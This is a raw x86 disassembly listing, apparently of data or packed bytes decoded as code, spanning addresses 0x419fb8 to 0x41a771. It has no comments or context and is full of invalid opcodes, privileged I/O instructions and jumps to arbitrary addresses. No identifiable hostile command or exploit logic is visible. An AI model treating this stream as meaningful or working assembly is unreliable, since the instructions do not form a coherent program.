  419fb8:	out    dx,al
  419fb9:	mov    BYTE PTR [eax+0x46c2b92b],dl
  419fbf:	popa   
  419fc0:	leave  
  419fc1:	(bad)
  419fc4:	push   0xa1e80fff
  419fc9:	mov    ebp,0xa5336720
  419fce:	or     eax,0x63659f73
  419fd3:	jle    0x419ffd
  419fd5:	nop/reserved BYTE PTR ds:0xed66ef1e
  419fdc:	mov    bh,0xc6
  419fde:	xchg   DWORD PTR [esp+edi*1-0x20984b9f],ebx
  419fe5:	and    BYTE PTR gs:[ecx-0x6463dc90],ah
  419fec:	xchg   DWORD PTR [ebx-0x6b],edi
  419fef:	lock repz mov ax,ds:0x8160d9e5
  419ff7:	push   edx
  419ff8:	out    0x49,eax
  419ffa:	jp     0x41a027
  419ffc:	cmp    ebx,eax
  419ffe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fff:	int    0x82
  41a001:	dec    ecx
  41a002:	scas   eax,DWORD PTR es:[edi]
  41a003:	daa    
  41a004:	cs call 0x7f7c:0xaa66e40d
  41a00c:	pop    ebp
  41a00d:	cmp    DWORD PTR [ecx-0x3cc08b8c],eax
  41a013:	fisubr DWORD PTR [ebx-0x4abf55cc]
  41a019:	jmp    0xcfbe089a
  41a01e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a01f:	mov    edi,DWORD PTR [ebx]
  41a021:	jmp    0x52b7095a
  41a026:	fisub  DWORD PTR [esp+edx*8-0xd]
  41a02a:	lea    eax,[edi-0x27]
  41a02d:	inc    edi
  41a02e:	scas   al,BYTE PTR es:[edi]
  41a02f:	mov    DWORD PTR [edi+ebp*4-0x46f78422],edx
  41a036:	add    al,0x1f
  41a038:	jbe    0x419ffd
  41a03a:	mov    eax,0x4a5c9302
  41a03f:	arpl   WORD PTR [ebx+0x10faba53],dx
  41a045:	sub    BYTE PTR [esp+edi*1-0x67],ah
  41a049:	mov    BYTE PTR [ebx-0x760c8e96],al
  41a04f:	sbb    BYTE PTR [ecx],bl
  41a051:	out    dx,al
  41a052:	push   esi
  41a053:	call   0xbbc2afc7
  41a058:	push   edi
  41a059:	inc    ebp
  41a05a:	mov    al,0xe2
  41a05c:	pusha  
  41a05d:	pusha  
  41a05e:	cwde   
  41a05f:	and    BYTE PTR [esi+ebx*4],al
  41a062:	stos   BYTE PTR es:[edi],al
  41a063:	add    eax,0x6c50087d
  41a068:	imul   edx,DWORD PTR [ebp+0x7],0xffffff9e
  41a06c:	in     eax,dx
  41a06d:	jae    0x41a0cf
  41a06f:	stos   DWORD PTR es:[edi],eax
  41a070:	cmp    DWORD PTR [ebp+0x4a],0xd74f9b0e
  41a077:	outs   dx,BYTE PTR ds:[esi]
  41a078:	push   ecx
  41a079:	repnz mov bh,0xc8
  41a07c:	mov    BYTE PTR [edi],0x23
  41a07f:	stos   BYTE PTR es:[edi],al
  41a080:	sbb    DWORD PTR [ecx+0x46],ecx
  41a083:	jne    0x41a0da
  41a085:	mov    ebp,DWORD PTR [ebx-0x2c]
  41a088:	out    0x70,al
  41a08a:	neg    BYTE PTR [ebx-0x53390ad6]
  41a090:	sbb    DWORD PTR [eax+0x46],ebx
  41a093:	mov    esp,0x237e887e
  41a098:	adc    DWORD PTR [ebx-0x40541eb8],ecx
  41a09e:	mov    esi,0x95e46fcf
  41a0a3:	js     0x41a091
  41a0a5:	inc    eax
  41a0a6:	mov    WORD PTR [edx+0x5e],si
  41a0aa:	pop    ss
  41a0ab:	aad    0xe0
  41a0ad:	push   ebp
  41a0ae:	(bad)  
  41a0af:	lock jb 0x41a103
  41a0b2:	mov    bl,0x42
  41a0b4:	cs mov bl,0x6e
  41a0b7:	jbe    0x41a05f
  41a0b9:	cli    
  41a0ba:	pop    esi
  41a0bb:	xor    dh,BYTE PTR [ebx-0x18fe1a09]
  41a0c1:	adc    eax,0x45172bf1
  41a0c6:	in     al,dx
  41a0c7:	sbb    DWORD PTR [ebx-0x7ba0efe3],0xffffff85
  41a0ce:	jne    0x41a081
  41a0d0:	xor    eax,0x7e117f4a
  41a0d5:	hlt    
  41a0d6:	cmp    ch,BYTE PTR [ebx]
  41a0d8:	xlat   BYTE PTR ds:[ebx]
  41a0d9:	adc    al,0x44
  41a0db:	mov    ebx,0xf20c23d3
  41a0e0:	inc    edi
  41a0e1:	mov    WORD PTR [ecx],es
  41a0e3:	adc    eax,0xc0828a86
  41a0e8:	xor    edi,ebp
  41a0ea:	retf   0xeb79
  41a0ed:	mov    BYTE PTR [ebx+0x178db33d],cl
  41a0f3:	icebp  
  41a0f4:	test   DWORD PTR [eax+edi*2+0x4b2eded1],eax
  41a0fb:	mov    DWORD PTR [esi],ebx
  41a0fd:	fcom   DWORD PTR [eax+0x44579b1b]
  41a103:	(bad)  
  41a104:	pop    edi
  41a105:	call   0xb455:0x6c35b100
  41a10c:	xor    al,0x80
  41a10e:	push   ebp
  41a10f:	push   ebp
  41a110:	out    0x9a,al
  41a112:	xchg   esp,eax
  41a113:	xor    DWORD PTR [edi],0x1d841444
  41a119:	cdq    
  41a11a:	xlat   BYTE PTR ds:[ebx]
  41a11b:	stc    
  41a11c:	inc    esi
  41a11d:	cld    
  41a11e:	sub    al,0x1
  41a120:	(bad)  
  41a122:	pextrw esp,(bad),0xc5
  41a124:	fs xchg esp,eax
  41a126:	jg     0x41a17a
  41a128:	jne    0x41a116
  41a12a:	xor    ecx,ebx
  41a12c:	ret    
  41a12d:	aam    0x3
  41a12f:	(bad)  
  41a130:	pop    edx
  41a131:	mov    esp,0x252a9479
  41a136:	cmp    eax,0x2bc59646
  41a13b:	fs xchg ebp,eax
  41a13d:	test   eax,0xbb2aa1a4
  41a142:	clc    
  41a143:	ins    BYTE PTR es:[edi],dx
  41a144:	push   es
  41a145:	pop    esp
  41a146:	sahf   
  41a147:	dec    ebp
  41a149:	add    al,0xa1
  41a14b:	adc    BYTE PTR [ebp-0x50],al
  41a14e:	sbb    eax,0xcc2348d3
  41a153:	jns    0x41a1c2
  41a155:	add    eax,0xdaaa5d9e
  41a15a:	call   0xe40c:0xc15d1ddd
  41a161:	adc    dl,ah
  41a163:	out    dx,al
  41a164:	add    edi,DWORD PTR [esi+0x6e139a9c]
  41a16a:	gs jmp 0xaacc9a0d
  41a170:	enter  0xcbfa,0x19
  41a174:	daa    
  41a175:	jl     0x41a1ed
  41a177:	cmc    
  41a178:	repnz out dx,al
  41a17a:	mov    eax,0xe4c7198d
  41a17f:	stos   DWORD PTR es:[edi],eax
  41a180:	dec    ebx
  41a181:	or     dl,BYTE PTR [ebp+eax*4+0x1858028e]
  41a188:	and    ch,BYTE PTR [ecx+0x2]
  41a18b:	les    esi,FWORD PTR [ebx-0x4d43e5f9]
  41a191:	cmp    eax,0x71bf3e46
  41a197:	cmp    al,BYTE PTR [ebp+0x5d]
  41a19a:	out    dx,eax
  41a19b:	pop    esp
  41a19c:	aas    
  41a19d:	inc    ecx
  41a19e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a19f:	out    0xad,al
  41a1a1:	into   
  41a1a2:	xchg   esp,eax
  41a1a3:	mov    edx,0x25a3ddd3
  41a1a8:	out    dx,eax
  41a1a9:	mov    bh,0xb3
  41a1ab:	cmp    ebx,DWORD PTR [edx+esi*8+0x11298a38]
  41a1b2:	jl     0x41a212
  41a1b4:	cmp    al,al
  41a1b6:	xchg   edx,eax
  41a1b7:	lds    ecx,FWORD PTR ds:0x8760bb67
  41a1bd:	inc    ecx
  41a1be:	pushf  
  41a1bf:	add    eax,0xbb8f1827
  41a1c4:	mov    al,0x9e
  41a1c6:	sbb    dh,BYTE PTR [esi]
  41a1c8:	je     0x41a216
  41a1ca:	mov    eax,ecx
  41a1cc:	sbb    DWORD PTR [esi],ecx
  41a1ce:	push   edx
  41a1cf:	ds repnz and bh,BYTE PTR ds:[edx]
  41a1d4:	or     BYTE PTR [edx-0x67a04d77],0xea
  41a1db:	lods   eax,DWORD PTR ds:[esi]
  41a1dc:	add    al,0x41
  41a1de:	mov    edi,0xf1bcbd5e
  41a1e3:	fs mov ebx,0xe0075a98
  41a1e9:	adc    BYTE PTR [ebp+0x22],0xc9
  41a1ed:	lea    edx,[ecx-0x7]
  41a1f0:	es in  eax,0xe0
  41a1f3:	and    ecx,edi
  41a1f5:	mov    esi,0x2bce042a
  41a1fa:	fwait
  41a1fb:	sub    BYTE PTR [edx+0x444a5c7b],ch
  41a201:	ror    BYTE PTR [ecx-0x67866e50],cl
  41a207:	cli    
  41a208:	mov    al,ds:0x31b87dec
  41a20d:	jbe    0x41a1c1
  41a20f:	shl    DWORD PTR [ecx+0x39],cl
  41a212:	jge    0x41a19b
  41a214:	sbb    dl,BYTE PTR [edi+0x12c6810b]
  41a21a:	push   esp
  41a21b:	into   
  41a21c:	jo     0x41a207
  41a21e:	leave  
  41a21f:	and    DWORD PTR [ebp-0x478c50e0],ecx
  41a225:	or     ebp,DWORD PTR [esi-0x115a61a1]
  41a22b:	push   ss
  41a22c:	neg    DWORD PTR [ebx]
  41a22e:	test   DWORD PTR [ebx-0x74],edi
  41a231:	pop    ebp
  41a232:	(bad)  
  41a233:	popa   
  41a234:	add    bl,al
  41a236:	xchg   ebp,eax
  41a237:	add    edi,ecx
  41a239:	ror    ch,cl
  41a23b:	imul   ebp,DWORD PTR [ebp-0x6543409d],0xffffff95
  41a242:	pop    ecx
  41a243:	cwde   
  41a244:	and    esp,DWORD PTR [edi]
  41a246:	repz and edx,DWORD PTR [edx+0x23]
  41a24a:	call   0x72a3:0x3513700f
  41a251:	shl    BYTE PTR [edx],0x70
  41a254:	mov    ah,0x4f
  41a256:	sbb    eax,0xbe7a223f
  41a25b:	xchg   ebp,eax
  41a25c:	mov    ds:0xcb01fb43,al
  41a261:	jge    0x41a294
  41a263:	fs pop edx
  41a265:	loop   0x41a2b0
  41a267:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a268:	pop    eax
  41a269:	push   es
  41a26a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a26b:	mov    ds:0x18f20110,al
  41a270:	loopne 0x41a20f
  41a272:	inc    esi
  41a273:	mov    eax,ecx
  41a275:	ja     0x41a2a8
  41a277:	inc    ecx
  41a278:	dec    ebp
  41a279:	dec    DWORD PTR [ebx+0x3c]
  41a27c:	cmp    bh,BYTE PTR [esi+0x65]
  41a27f:	xor    BYTE PTR [edx+0x34],ch
  41a282:	push   ebp
  41a283:	cmc    
  41a284:	add    dl,BYTE PTR [ebx+0x18]
  41a287:	out    dx,eax
  41a288:	ficom  DWORD PTR [ebx+edi*8+0x2be98a85]
  41a28f:	xchg   edi,eax
  41a290:	inc    ebx
  41a291:	add    al,0x55
  41a293:	sbb    al,al
  41a295:	repz sub eax,esi
  41a298:	sub    edi,esi
  41a29a:	push   cs
  41a29b:	ror    BYTE PTR [ecx+0x49de5d14],cl
  41a2a1:	mov    bl,0x2d
  41a2a3:	sub    eax,0x5f7d0c7f
  41a2a8:	loop   0x41a282
  41a2aa:	mov    DWORD PTR [ebp+0xb],edx
  41a2ad:	mov    gs,WORD PTR [eax-0x745a5fba]
  41a2b3:	jp     0x41a247
  41a2b5:	fs push cs
  41a2b7:	retf   0xf179
  41a2ba:	adc    DWORD PTR [ebx-0x15],edi
  41a2bd:	xchg   ecx,eax
  41a2be:	inc    esi
  41a2bf:	ror    BYTE PTR [edx-0x8],1
  41a2c2:	xchg   DWORD PTR [ebp+0x4c],edi
  41a2c5:	jge    0x41a26c
  41a2c7:	dec    esp
  41a2c8:	adc    BYTE PTR [esi],cl
  41a2ca:	int    0xfb
  41a2cc:	push   es
  41a2cd:	stos   DWORD PTR es:[edi],eax
  41a2ce:	dec    ebx
  41a2cf:	arpl   WORD PTR [esi+0x38ae795],di
  41a2d5:	aas    
  41a2d6:	dec    esi
  41a2d7:	jge    0x41a342
  41a2d9:	mov    bl,0x23
  41a2db:	mov    bl,0x55
  41a2dd:	stos   DWORD PTR es:[edi],eax
  41a2de:	or     ah,dh
  41a2e0:	aas    
  41a2e1:	int    0x2b
  41a2e3:	fist   DWORD PTR [esi]
  41a2e5:	je     0x41a2e0
  41a2e7:	push   0xe9162ecc
  41a2ec:	pop    ds
  41a2ed:	ins    BYTE PTR es:[edi],dx
  41a2ee:	cmp    esi,ebp
  41a2f0:	sub    ebp,0x2a
  41a2f3:	ret    
  41a2f4:	icebp  
  41a2f5:	jmp    0xcf74ad3
  41a2fa:	jnp    0x9318582
  41a300:	loope  0x41a2a4
  41a302:	repz pop esp
  41a304:	clc    
  41a305:	mov    edx,0x4eec32df
  41a30a:	lods   al,BYTE PTR ds:[esi]
  41a30b:	(bad)  
  41a30c:	neg    DWORD PTR [edi-0x57]
  41a30f:	jecxz  0x41a2b3
  41a311:	or     al,0xc1
  41a313:	(bad)
  41a316:	imul   eax,DWORD PTR [ebp-0x73ef62ba],0x88e5dad8
  41a320:	es cmp eax,0x35c681b8
  41a326:	sub    edi,DWORD PTR [ebp+0x75376dd4]
  41a32c:	mov    dh,0x22
  41a32e:	jae    0x41a3af
  41a330:	ret    
  41a331:	sahf   
  41a332:	jbe    0x41a2e5
  41a334:	fnsave ds:0xbbd3ab76
  41a33a:	sub    ah,BYTE PTR [eax]
  41a33c:	mov    al,ds:0xbac83a7f
  41a341:	rcr    ebx,1
  41a343:	xor    eax,0x16cd8bb6
  41a348:	call   0x5ab8:0x1304b09c
  41a34f:	xor    al,BYTE PTR [ecx]
  41a351:	adc    DWORD PTR [ecx],eax
  41a353:	mov    BYTE PTR [esi],dh
  41a355:	fs mov al,0x68
  41a358:	pop    ebx
  41a359:	test   eax,0xf40a3783
  41a35e:	dec    esi
  41a35f:	out    0xde,eax
  41a361:	stos   BYTE PTR es:[edi],al
  41a362:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a363:	clc    
  41a364:	enter  0xad2e,0x4e
  41a368:	mov    eax,0x87af75d7
  41a36d:	das    
  41a36e:	and    al,0xf9
  41a370:	ret    0xaba2
  41a373:	dec    ebp
  41a374:	(bad)  
  41a375:	mov    esi,0x73e1a4c
  41a37a:	add    BYTE PTR [esi],dl
  41a37c:	jmp    0x24be0933
  41a381:	sti    
  41a382:	mov    bh,cl
  41a384:	cli    
  41a385:	sbb    esp,DWORD PTR [ecx-0x59e8b6c2]
  41a38b:	add    ebx,ebp
  41a38d:	jbe    0x41a3e1
  41a38f:	lock fiadd WORD PTR [ebp+0x29]
  41a393:	loope  0x41a3f6
  41a395:	pop    ss
  41a396:	test   al,0xe3
  41a398:	fistp  QWORD PTR [esi]
  41a39a:	sar    BYTE PTR [edx+ebx*4],1
  41a39d:	dec    esp
  41a39e:	outs   dx,BYTE PTR ds:[esi]
  41a39f:	jle    0x41a354
  41a3a1:	and    eax,DWORD PTR [esi-0x40]
  41a3a4:	fdivr  QWORD PTR [eax-0x3d]
  41a3a7:	fld    DWORD PTR [eax-0x6a]
  41a3aa:	mov    ch,0xe
  41a3ac:	inc    ecx
  41a3ad:	cmp    dl,0x9e
  41a3b0:	inc    esp
  41a3b1:	(bad)  
  41a3b3:	jno    0x41a423
  41a3b5:	pusha  
  41a3b6:	cmc    
  41a3b7:	mov    ds:0x1ef40a0e,eax
  41a3bc:	icebp  
  41a3bd:	cs inc ecx
  41a3bf:	mov    DWORD PTR [ebx+0x59acff58],0x5e21f98f
  41a3c9:	ret    0x6b96
  41a3cc:	cmp    ecx,DWORD PTR [eax-0x3eebbced]
  41a3d2:	js     0x41a396
  41a3d4:	xchg   edx,eax
  41a3d5:	aam    0x7f
  41a3d7:	ins    DWORD PTR es:[edi],dx
  41a3d8:	fild   QWORD PTR [edi-0x57]
  41a3db:	lds    edi,FWORD PTR [esi+0x5e]
  41a3de:	adc    BYTE PTR [ecx+0x2928aed],dh
  41a3e4:	mov    dl,0x46
  41a3e6:	mov    edi,ebp
  41a3e8:	test   al,0x66
  41a3ea:	cmp    al,0xb7
  41a3ed:	xchg   ebp,eax
  41a3ee:	scas   eax,DWORD PTR es:[edi]
  41a3ef:	ss stc 
  41a3f1:	dec    edi
  41a3f2:	leave  
  41a3f3:	push   edi
  41a3f4:	shr    DWORD PTR [ecx],cl
  41a3f6:	rcl    BYTE PTR [ebp+0x7ae463ea],cl
  41a3fc:	inc    esi
  41a3fd:	cmp    ah,cl
  41a3ff:	scas   eax,DWORD PTR es:[edi]
  41a400:	sbb    dh,BYTE PTR [eax+0x41]
  41a403:	mov    ebx,0x6075674b
  41a408:	mov    BYTE PTR [ebx+0x3be5abbd],bh
  41a40e:	outs   dx,BYTE PTR ds:[esi]
  41a40f:	stos   DWORD PTR es:[edi],eax
  41a410:	mov    cl,0x5f
  41a412:	fcmovnu st,st(1)
  41a414:	push   edi
  41a415:	xor    DWORD PTR [ecx+0x11c69156],esi
  41a41b:	call   0xb1f95850
  41a420:	ins    BYTE PTR es:[edi],dx
  41a421:	rcl    BYTE PTR [ecx+0x2be1abc3],cl
  41a427:	int3   
  41a428:	popa   
  41a429:	lahf   
  41a42a:	sub    dl,dh
  41a42c:	test   al,0xfb
  41a42e:	mov    ?,WORD PTR [eax-0x7a4a6d31]
  41a434:	repnz inc eax
  41a436:	fsub   DWORD PTR [ebx+0x63]
  41a439:	inc    edx
  41a43a:	es pop es
  41a43c:	aam    0xbf
  41a43e:	or     ch,ch
  41a440:	xor    ebx,DWORD PTR [ebx]
  41a442:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41a444:	hlt    
  41a445:	and    ebx,esi
  41a447:	dec    ebp
  41a448:	mov    edi,0x1c2e6d2b
  41a44d:	cwde   
  41a44e:	jp     0x41a442
  41a450:	sbb    bl,ch
  41a452:	adc    edi,ecx
  41a454:	retf   
  41a455:	pop    ss
  41a456:	and    BYTE PTR [ecx],dh
  41a458:	ret    0xc03f
  41a45b:	push   0xffffffb6
  41a45d:	jae    0x41a45a
  41a45f:	mov    ecx,0x3725975c
  41a464:	adc    DWORD PTR [esi-0x3d],ebp
  41a467:	pop    esp
  41a468:	jnp    0x41a3f8
  41a46a:	add    eax,0x8cb81c
  41a46f:	out    dx,eax
  41a470:	cmp    edx,eax
  41a472:	sub    DWORD PTR cs:[ebp+0xf654dfe],esp
  41a479:	xchg   esi,eax
  41a47a:	retf   0x946a
  41a47d:	in     eax,dx
  41a47e:	xchg   DWORD PTR [ecx],edi
  41a480:	adc    DWORD PTR [ebp+0x47473f20],ebx
  41a486:	call   0x3f30:0x4cbbd031
  41a48d:	and    DWORD PTR [eax-0xfa60b7],esi
  41a493:	mov    eax,ecx
  41a495:	shl    BYTE PTR [eax-0x49ea0452],0x7
  41a49c:	sbb    eax,0x3a4feffd
  41a4a1:	xor    al,0x9e
  41a4a3:	xchg   edx,eax
  41a4a4:	push   ebx
  41a4a5:	mov    BYTE PTR [ebx-0x9efd1ac],dl
  41a4ab:	mov    dh,0x27
  41a4ad:	arpl   si,dx
  41a4af:	rol    BYTE PTR [esi],0x19
  41a4b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4b3:	rcr    BYTE PTR [ebp+0xd],cl
  41a4b6:	ror    DWORD PTR [esp-0x7119b1ac],0xb
  41a4be:	into   
  41a4bf:	(bad)  
  41a4c0:	cmp    eax,0xa4358a21
  41a4c5:	adc    al,0xbb
  41a4c7:	imul   ebp,DWORD PTR [edx],0x97282240
  41a4cd:	test   BYTE PTR [ecx+0x4debcb2e],bl
  41a4d3:	gs cld 
  41a4d5:	mov    WORD PTR [edx-0x1c4d77a1],es
  41a4db:	xor    BYTE PTR [ecx+0x42],dh
  41a4de:	loop   0x41a4f6
  41a4e0:	imul   esp,DWORD PTR [eax+0x77734a76],0x23447cb6
  41a4ea:	add    bh,BYTE PTR [ecx+0x72]
  41a4ed:	fwait
  41a4ee:	mov    bh,BYTE PTR [ecx]
  41a4f0:	jle    0x41a55c
  41a4f2:	dec    esi
  41a4f3:	mov    esi,0xbb2c7875
  41a4f8:	jmp    0x6c44b7c6
  41a4fd:	rcr    DWORD PTR [edx+0x3c243ba0],0x29
  41a504:	push   ds
  41a505:	push   edi
  41a506:	cmc    
  41a507:	adc    DWORD PTR [ecx+ecx*8-0x4f],eax
  41a50b:	nop
  41a50c:	adc    edx,DWORD PTR [ebx-0x7bc5ddc4]
  41a512:	inc    esp
  41a513:	dec    esi
  41a514:	mov    eax,ds:0x65f3e37e
  41a519:	jae    0x41a596
  41a51b:	leave  
  41a51c:	add    ebx,DWORD PTR [esi-0x57570f6c]
  41a522:	icebp  
  41a523:	rol    eax,0x30
  41a526:	fwait
  41a527:	adc    eax,esp
  41a529:	bound  esp,QWORD PTR [esi]
  41a52b:	fidiv  DWORD PTR [edi-0x24]
  41a52e:	div    BYTE PTR [ecx-0x47d28761]
  41a534:	in     al,0xa0
  41a536:	aaa    
  41a537:	fcomp  DWORD PTR [edx+edi*4+0x4067750d]
  41a53e:	jge    0x41a59a
  41a540:	add    DWORD PTR [ebp-0x70479ff9],ecx
  41a546:	dec    ebp
  41a547:	ds jne 0x41a540
  41a54a:	jnp    0x41a55d
  41a54c:	mov    bl,0xd4
  41a54e:	das    
  41a54f:	cli    
  41a550:	jnp    0x41a5a4
  41a552:	js     0x41a548
  41a554:	pop    edx
  41a555:	test   al,0x9d
  41a557:	lods   al,BYTE PTR ds:[esi]
  41a558:	adc    ebp,DWORD PTR ds:0x1f399a25
  41a55e:	jge    0x41a506
  41a560:	xor    BYTE PTR [edx],0x8d
  41a563:	(bad)  
  41a564:	js     0x41a592
  41a566:	fsubrp st(7),st
  41a568:	push   edx
  41a569:	repz data16 rep lods al,BYTE PTR ds:[esi]
  41a56d:	cmp    eax,0xe7afc05d
  41a572:	xchg   ebx,eax
  41a573:	jb     0x41a50c
  41a575:	sar    BYTE PTR [esi],0x77
  41a578:	fs jecxz 0x41a56d
  41a57b:	data16 and dl,BYTE PTR [esi]
  41a57e:	dec    edi
  41a57f:	push   ebp
  41a580:	adc    edi,DWORD PTR [edx*2+0x7aa434a7]
  41a587:	ds mov al,0x3d
  41a58a:	out    dx,al
  41a58b:	push   ebp
  41a58c:	ss dec edi
  41a58e:	sbb    ch,BYTE PTR [ebp+0x7613d450]
  41a594:	mov    al,ds:0x911fa5b4
  41a599:	mov    al,0x4a
  41a59b:	sub    al,BYTE PTR [edi+ebx*4]
  41a59e:	cmp    ch,BYTE PTR [edx+edi*8]
  41a5a1:	xor    esp,edi
  41a5a3:	iret   
  41a5a4:	retf   0xe740
  41a5a7:	dec    edi
  41a5a8:	popa   
  41a5a9:	jb     0x41a611
  41a5ab:	sbb    DWORD PTR [eax+0x53f85df7],esi
  41a5b1:	cmp    dl,BYTE PTR [edi]
  41a5b3:	ja     0x41a632
  41a5b5:	retf   0xe1c9
  41a5b8:	ror    BYTE PTR [esi-0xb],cl
  41a5bb:	gs xchg edx,eax
  41a5bd:	inc    edx
  41a5be:	test   BYTE PTR [ebx+0x4c],bh
  41a5c1:	push   edx
  41a5c2:	xor    eax,DWORD PTR [ecx+0x33a64330]
  41a5c8:	fistp  DWORD PTR [edi]
  41a5ca:	mov    esp,0x91fd539e
  41a5cf:	out    0x2,al
  41a5d1:	dec    esp
  41a5d2:	push   edi
  41a5d3:	xor    ebx,esp
  41a5d5:	out    0xbf,al
  41a5d7:	and    DWORD PTR [esi-0x5a56da5d],esi
  41a5dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5de:	(bad)  
  41a5df:	ds add al,0xa4
  41a5e2:	adc    al,0xf1
  41a5e4:	inc    esp
  41a5e5:	sbb    al,0xba
  41a5e7:	cmp    DWORD PTR [edi],esp
  41a5e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5ea:	mov    cl,0x12
  41a5ed:	push   0x58365636
  41a5f2:	lock sbb eax,0x9135dd0
  41a5f8:	mov    DWORD PTR [esi-0x956ff6c],edi
  41a5fe:	xchg   ecx,eax
  41a5ff:	enter  0x45a5,0x50
  41a603:	xor    BYTE PTR ss:[esi+0x6c],cl
  41a607:	add    eax,0xdd0904b4
  41a60c:	(bad)  
  41a60e:	sub    eax,0x187dedf
  41a613:	jmp    0x3db890e9
  41a618:	xor    DWORD PTR [si-0x50],ecx
  41a61c:	dec    ebx
  41a61d:	mov    al,ds:0x51287bca
  41a622:	adc    DWORD PTR [edx-0x101fc736],ebx
  41a628:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a629:	cmp    bl,BYTE PTR [eax]
  41a62b:	cs mov eax,0xe34999fe
  41a631:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a632:	mov    edi,0x8dbe3ebf
  41a637:	sbb    eax,DWORD PTR [edx+0x5e]
  41a63a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a63b:	or     BYTE PTR [esi],bh
  41a63d:	pop    esp
  41a63e:	jge    0x41a6a4
  41a640:	sbb    ah,dl
  41a642:	in     al,0x0
  41a644:	and    eax,0xe3accd59
  41a649:	xor    DWORD PTR [ebx+0x33],edx
  41a64c:	shl    edx,1
  41a64e:	mov    ch,BYTE PTR [ebx-0x3a]
  41a651:	mov    edi,0x872cda69
  41a656:	sub    DWORD PTR ds:0xeecbdcdf,esp
  41a65c:	fidivr WORD PTR [ebp+ebp*1+0x4b]
  41a660:	cdq    
  41a661:	xlat   BYTE PTR ds:[ebx]
  41a662:	das    
  41a663:	imul   ecx,edx,0x596dfa00
  41a669:	mov    bh,0x72
  41a66b:	stos   DWORD PTR es:[edi],eax
  41a66c:	sub    DWORD PTR [edx+0x18cec47c],edx
  41a672:	and    ah,dh
  41a674:	test   eax,0x390ad37d
  41a679:	inc    edx
  41a67a:	mov    ebx,0x979ea8a0
  41a67f:	retf   
  41a680:	cmp    al,0x8b
  41a682:	leave  
  41a683:	add    dh,bh
  41a685:	and    al,0x8a
  41a687:	fidivr WORD PTR [ebx+ebp*2]
  41a68a:	jecxz  0x41a674
  41a68c:	test   BYTE PTR [eax+eiz*1+0x57a539ad],al
  41a693:	fmul   DWORD PTR [edx]
  41a695:	retf   
  41a696:	or     edx,DWORD PTR [edi]
  41a698:	outs   dx,DWORD PTR ds:[esi]
  41a699:	adc    BYTE PTR [eax+0x0],bh
  41a69c:	cmp    al,0x5e
  41a69e:	sahf   
  41a69f:	lds    esi,FWORD PTR [esi+esi*1-0x7fe8d884]
  41a6a6:	and    ebp,DWORD PTR [ebp+0x4f80f53a]
  41a6ac:	shl    BYTE PTR [edi+0x5d],0x6d
  41a6b0:	sub    DWORD PTR [esi-0x6e],0x58
  41a6b4:	inc    esi
  41a6b5:	or     bh,BYTE PTR [ebx+esi*2+0x503de49b]
  41a6bc:	pop    edi
  41a6bd:	mov    ebx,esp
  41a6bf:	dec    ebx
  41a6c0:	dec    ebx
  41a6c1:	sub    al,0x16
  41a6c3:	stos   DWORD PTR es:[edi],eax
  41a6c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6c5:	cmp    al,0x49
  41a6c7:	mov    ch,BYTE PTR [eax]
  41a6c9:	jg     0x41a668
  41a6cb:	stos   DWORD PTR es:[edi],eax
  41a6cc:	pushf  
  41a6cd:	sbb    eax,0xf5a363df
  41a6d2:	hlt    
  41a6d3:	stc    
  41a6d4:	mov    bh,0xf4
  41a6d6:	clc    
  41a6d7:	add    bl,bh
  41a6d9:	xor    BYTE PTR [eax-0x44],0x1d
  41a6dd:	cmp    bl,cl
  41a6df:	mov    ecx,0x4462dc8c
  41a6e4:	sub    BYTE PTR [ebp+0x3b6a2361],dh
  41a6ea:	loopne 0x41a697
  41a6ec:	dec    edx
  41a6ed:	or     eax,0x3e8fbaa2
  41a6f2:	xor    ch,BYTE PTR [eax]
  41a6f4:	sub    DWORD PTR [ebp-0x76],0x7e3a4cd8
  41a6fb:	jae    0x41a71e
  41a6fd:	pop    es
  41a6fe:	add    BYTE PTR [edx+0x2f],ch
  41a701:	int    0x50
  41a703:	or     eax,0x179913ec
  41a708:	idiv   BYTE PTR [esp+esi*1]
  41a70b:	sbb    dh,BYTE PTR [ebx-0x75]
  41a70e:	mov    ah,0x15
  41a710:	sub    ah,BYTE PTR [eax-0x8]
  41a713:	repnz and al,0x66
  41a717:	std    
  41a718:	fld    TBYTE PTR [edx+0x35]
  41a71b:	push   0xffffffaa
  41a71d:	outs   dx,BYTE PTR ds:[esi]
  41a71e:	xchg   edi,eax
  41a71f:	(bad)  
  41a720:	jp     0x41a6f7
  41a722:	mov    esp,DWORD PTR [edx+edi*4]
  41a725:	(bad)  
  41a726:	jg     0x41a6da
  41a728:	cmp    eax,0x48c60398
  41a72d:	pop    ebx
  41a72e:	aam    0x87
  41a730:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a731:	loopne 0x41a755
  41a733:	jg     0x41a72d
  41a735:	mov    DWORD PTR [ecx],ebp
  41a737:	xchg   BYTE PTR [ebx+0x61],ch
  41a73a:	loope  0x41a71d
  41a73c:	jecxz  0x41a79d
  41a73e:	cmp    dl,BYTE PTR [eax+0x6f]
  41a741:	jmp    0x8cef:0x4d7091b7
  41a748:	or     esi,eax
  41a74a:	test   al,0x4c
  41a74c:	push   ecx
  41a74d:	int3   
  41a74e:	dec    esi
  41a74f:	add    al,0x8c
  41a751:	cs mov edx,0xdee05525
  41a757:	test   ah,cl
  41a759:	repnz into 
  41a75b:	in     eax,0x32
  41a75d:	or     BYTE PTR [edx+0x649874f3],al
  41a763:	xchg   esi,eax
  41a764:	stc    
  41a765:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a766:	mov    WORD PTR [edi-0x5352dedd],gs
  41a76c:	ds jl  0x41a75e
  41a76f:	sti    
  41a770:	scas   al,BYTE PTR es:[edi]
  41a771:	(bad)  
